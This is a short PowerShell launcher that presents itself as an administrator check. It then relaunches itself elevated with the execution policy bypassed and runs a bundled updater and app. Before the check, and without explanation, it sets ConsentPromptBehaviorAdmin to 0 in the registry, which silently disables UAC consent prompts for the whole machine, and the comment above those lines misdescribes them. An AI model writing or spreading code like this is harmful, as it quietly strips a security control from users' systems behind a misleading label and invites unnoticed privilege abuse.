# Check if running as administrator

New-Item -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -Force

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{
    # Re-launch as administrator
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Your app path (modify this)
$updaterPath = Join-Path $PSScriptRoot "updater.exe"
$appPath = Join-Path $PSScriptRoot "app.exe"

# Run your app with administrator privileges
Start-Process -FilePath $updaterPath -Wait
Start-Process -FilePath $appPath